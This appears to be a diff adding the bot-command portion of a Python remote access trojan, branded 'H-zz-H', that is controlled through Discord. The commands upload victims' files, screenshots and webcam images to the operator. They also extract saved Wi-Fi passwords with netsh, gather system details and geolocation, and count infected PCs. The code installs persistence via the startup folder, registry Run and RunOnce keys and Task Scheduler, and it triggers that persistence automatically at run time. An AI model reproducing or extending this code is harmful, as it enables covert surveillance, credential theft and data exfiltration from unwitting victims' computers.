+    try:
+        if path is None:
+            embed = discord.Embed(
+                title="📂 Current Directory",
+                description=f"The current working directory is: {current_directory}",
+                color=0x00ff00
+            )
+        elif path == "..":
+            parent_directory = os.path.dirname(current_directory)
+            current_directory = parent_directory
+            embed = discord.Embed(
+                title="🛠️ CD Command",
+                description=f"Moved up one directory to: {current_directory}",
+                color=0x00ff00
+            )
+        else:
+            new_path = os.path.join(current_directory, path)
+
+            if os.path.isdir(new_path):
+                current_directory = new_path
+                embed = discord.Embed(
+                    title="🛠️ CD Command",
+                    description=f"Successfully changed directory to: {current_directory}",
+                    color=0x00ff00
+                )
+            else:
+                embed = discord.Embed(
+                    title="❌ CD Command Error",
+                    description=f"Directory not found: {path}",
+                    color=0xff0000
+                )
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ CD Command Error",
+            description=f"An error occurred while changing directory: {str(e)}",
+            color=0xff0000
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def list(ctx):
+    global current_directory
+
+    try:
+        files = os.listdir(current_directory)
+
+        if not files:
+            files = ["No files or directories found."]
+        
+        items_per_page = 10
+        total_files = len(files)
+        total_pages = math.ceil(total_files / items_per_page)
+
+        current_page = 1
+
+        def create_embed(page):
+            start = (page - 1) * items_per_page
+            end = min(start + items_per_page, total_files)
+            file_list = files[start:end]
+
+            embed = discord.Embed(
+                title="📂 File List",
+                description=f"Files in {current_directory} (Page {page}/{total_pages}):",
+                color=0x00ff00
+            )
+            embed.add_field(name="Files", value="\n".join(file_list), inline=False)
+            return embed
+
+        embed = create_embed(current_page)
+        message = await ctx.send(embed=embed)
+
+        if total_pages > 1:
+            await message.add_reaction("⬅️")
+            await message.add_reaction("➡️")
+
+        def check(reaction, user):
+            return user == ctx.author and str(reaction.emoji) in ["⬅️", "➡️"] and reaction.message.id == message.id
+
+        while True:
+            try:
+                reaction, user = await bot.wait_for('reaction_add', timeout=10, check=check)
+
+                if str(reaction.emoji) == "➡️" and current_page < total_pages:
+                    current_page += 1
+                elif str(reaction.emoji) == "⬅️" and current_page > 1:
+                    current_page -= 1
+
+                new_embed = create_embed(current_page)
+                await message.edit(embed=new_embed)
+                await message.remove_reaction(reaction.emoji, user)
+
+            except asyncio.TimeoutError:
+                await message.clear_reactions()
+                break
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ List Command Error",
+            description=f"An error occurred while listing the files: {str(e)}",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def download(ctx, filename: str):
+    global current_directory
+
+    try:
+        file_path = os.path.join(current_directory, filename)
+
+        if os.path.exists(file_path) and os.path.isfile(file_path):
+            await ctx.send(file=discord.File(file_path))
+            embed = discord.Embed(
+                title="📤 File Sent",
+                description=f"Successfully sent the file: {filename}",
+                color=0x00ff00
+            )
+        else:
+            embed = discord.Embed(
+                title="❌ File Send Error",
+                description=f"File not found: {filename} in {current_directory}",
+                color=0xff0000
+            )
+    except Exception as e:
+        embed = discord.Embed(
+            title="❌ File Send Error",
+            description=f"An error occurred while sending the file: {str(e)}",
+            color=0xff0000
+        )
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def startup(ctx):
+    hzzh()
+    hzzhtemp()
+    hzzhreg()
+    hzzh_task_scheduler()
+    hzzh_runonce()
+
+    embed = discord.Embed(
+        title="🐀 StartUp",
+        description="The following actions were performed to add H-zz-H to startup:",
+        color=0x00ff00
+    )
+
+    embed.add_field(name="Shell:Startup", value="Put H-zz-H in shell:startup 🐀", inline=False)
+    embed.add_field(name="Temp StartUp", value="Put H-zz-H in Temp StartUp 🐀", inline=False)
+    embed.add_field(name="Windows Registry", value="Put H-zz-H in Windows Registry StartUp 🐀", inline=False)
+    embed.add_field(name="Task Scheduler", value="Put H-zz-H in Task Scheduler 🐀", inline=False)
+    embed.add_field(name="Registry (RunOnce)", value="Put H-zz-H in Windows Registry StartUp 2 🐀", inline=False)
+
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def running(ctx):
+    number_of_active_pcs = len(active_pcs)
+    embed = discord.Embed(
+        title="🖥️ Running",
+        description=f"🖥️ Currently, there are {number_of_active_pcs} unique PCs running the script!",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def screen(ctx):
+    try:
+        file_path = os.path.join(os.environ['TEMP'], "hzzh.png")
+        screenshot = pyautogui.screenshot()
+        screenshot.save(file_path)
+
+        embed = discord.Embed(
+            title="🖼️ Screenshot",
+            description="Succesfully took a Screenshot:",
+            color=0x00ff00
+        )
+        
+        file = discord.File(file_path, filename="screenshot.png")
+        embed.set_image(url="attachment://screenshot.png")
+        await ctx.send(embed=embed, file=file)
+
+        os.remove(file_path)
+
+    except Exception as e:
+        await ctx.send(f"❌ Fehler beim Erstellen des Screenshots: {e}")
+
+@bot.command()
+async def error(ctx, *, message: str):
+    try:
+        if "|" in message:
+            title, msg = message.split("|", 1)
+            title = title.strip() 
+            msg = msg.strip()  
+        else:
+            title = "Unknown Error"
+            msg = message.strip()
+
+        embed = discord.Embed(
+            title=f"⚠️ {title}", 
+            description=f"**Message:**\n`{msg}`", 
+            color=0xFF0000  
+        )
+
+        await ctx.send(embed=embed)
+
+        ctypes.windll.user32.MessageBoxW(0, msg, title, 0x10)
+
+    except Exception as e:
+        embed = discord.Embed(
+            title="⚠️ Fake Error",
+            description="Fake Error failed to display!",
+            color=0xFF0000
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def information(ctx):
+    system_info = get_system_info()
+    embed = discord.Embed(
+        title="🖥️ System Information",
+        description=f"**PC Name: 🖥️**\n {system_info['PC Name']}\n"
+                    f"**IP Address: 🌐**\n {system_info['IP Address']}\n"
+                    f"**Geolocation: 📍**\n {system_info['Geolocation']}\n"
+                    f"**System Version: 🖱️**\n {system_info['System Version']}\n"
+                    f"**CPU Usage: ⚙️**\n {system_info['CPU Usage']}\n"
+                    f"**Memory Usage: 💾**\n {system_info['Memory Usage']}\n"
+                    f"**Disk Usage: 🗂️**\n {system_info['Disk Info']}\n\n"
+                    "Made with ❤ by H-zz-H.",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+def run_command(command, encoding='utf-8'):
+    try:
+        subprocess.run("chcp 65001", capture_output=True, shell=True, text=True)
+        
+        result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding=encoding)
+        return result.stdout
+    except UnicodeDecodeError:
+        try:
+            result = subprocess.run(command, capture_output=True, text=True, shell=True, encoding='cp1252')
+            return result.stdout
+        except Exception as e:
+            return f"Error executing command: {e}"
+
+@bot.command()
+async def network(ctx):
+    try:
+        output = run_command("netsh wlan show profiles")
+        
+        if output:
+            embed = discord.Embed(
+                title="🌐 Network",
+                description=f"🌐 **Wi-Fi Networks**:\n```\n{output}\n```",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="🌐 Network",
+                description=f"No Wi-Fi networks found.",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
+    
+    except Exception as e:
+        embed = discord.Embed(
+            title="🌐 Network",
+            description=f"Error: {e}",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def net_pass(ctx, wifi_name: str):
+    try:
+        output = run_command(f'netsh wlan show profile name="{wifi_name}" key=clear')
+        if output:
+            embed = discord.Embed(
+                title="🔑 Network Password",
+                description=f"🔑 **Password for {wifi_name}**: `{output}`",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title="🔑 Network Password",
+                description=f"🔑 No Password for {wifi_name} found.",
+                color=0x00ff00
+            )
+            await ctx.send(embed=embed)
+        
+    
+    except Exception as e:
+        embed = discord.Embed(
+            title="🔑 Network Password",
+            description=f"Error: {e}",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+
+@bot.command()
+async def disk(ctx):
+    system_info = get_system_info()
+    embed = discord.Embed(
+        title="📦 Disk Usage",
+        description=f"Disk Usage: {system_info['Disk Info']}",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def cpu(ctx):
+    system_info = get_system_info()
+    embed = discord.Embed(
+        title="⚙️ CPU Usage",
+        description=f"CPU Usage: {system_info['CPU Usage']}",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def ram(ctx):
+    system_info = get_system_info()
+    embed = discord.Embed(
+        title="💾 RAM Usage",
+        description=f"RAM Usage: {system_info['RAM Usage']}",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def overview(ctx):
+    system_info = get_system_info()
+    embed = discord.Embed(
+        title="🛠️ System Overview",
+        color=0x00ff00
+    )
+    embed.add_field(name="⚙️ CPU Usage", value=system_info["CPU Usage"], inline=False)
+    embed.add_field(name="💾 RAM Usage", value=system_info["RAM Usage"], inline=False)
+    embed.add_field(name="🗂️ Disk Usage", value=system_info["Disk Info"], inline=False)
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def battery(ctx):
+    battery_info = get_battery_status()
+    embed = discord.Embed(
+        title="🔋 Battery Status",
+        description=battery_info,
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+@bot.command()
+async def webcam(ctx):
+    try:
+        webcam_images = []
+        temp_folder = os.environ['TEMP']
+
+        for cam_index in range(10):
+            webcam = cv2.VideoCapture(cam_index)
+            ret, frame = webcam.read()
+            webcam.release()
+
+            if ret:
+                file_path = os.path.join(temp_folder, f"webcam_image_{cam_index}.png")
+                cv2.imwrite(file_path, frame)
+                webcam_images.append(file_path)
+
+        if not webcam_images:
+            await ctx.send("❌ No available webcams detected. Please ensure they are connected and accessible.")
+            return
+
+        embed = discord.Embed(
+            title="📸 Webcam",
+            description="Successfully captured images from available webcams:",
+            color=0x00ff00
+        )
+
+        for file_path in webcam_images:
+            file = discord.File(file_path, filename=os.path.basename(file_path))
+            embed.set_image(url=f"attachment://{os.path.basename(file_path)}")
+            await ctx.send(embed=embed, file=file)
+
+            os.remove(file_path)
+
+    except Exception as e:
+        await ctx.send(f"❌ An error occurred while accessing the webcams: {e}")
+
+@bot.command()
+async def tasks(ctx):
+    tasks_info = get_running_tasks()
+    
+    file_path = os.path.join(os.environ['TEMP'], "tasks_list.txt")
+    
+    with open(file_path, "w") as file:
+        file.write("\n".join(tasks_info))
+    
+    await ctx.send(file=discord.File(file_path))
+
+@bot.command()
+async def fakecmd(ctx, count: int):
+    try:
+        embed = discord.Embed(
+            title="💻 Fake CMD",
+            description=f"Successfully spammed {count} CMD windows:",
+            color=0x00ff00
+        )
+        await ctx.send(embed=embed)
+
+        for i in range(count):
+            subprocess.Popen('start cmd.exe', shell=True)
+
+            time.sleep(0.03)
+
+            subprocess.Popen('taskkill /f /im cmd.exe', shell=True)
+    
+    except Exception as e:
+        await ctx.send(f"❌ An error occurred: {e}")
+
+@bot.command()
+async def web_open(ctx, url):
+    os.system(f"start {url}")
+    embed = discord.Embed(
+        title="🌍 Webbrowser",
+        description=f"🌍 Opened {url} in the browser!",
+        color=0x00ff00
+    )
+    await ctx.send(embed=embed)
+
+hzzh()
+hzzhtemp()
+hzzhreg()
+hzzh_runonce()
+wait_for_wifi()
+bot.run(HzzH)
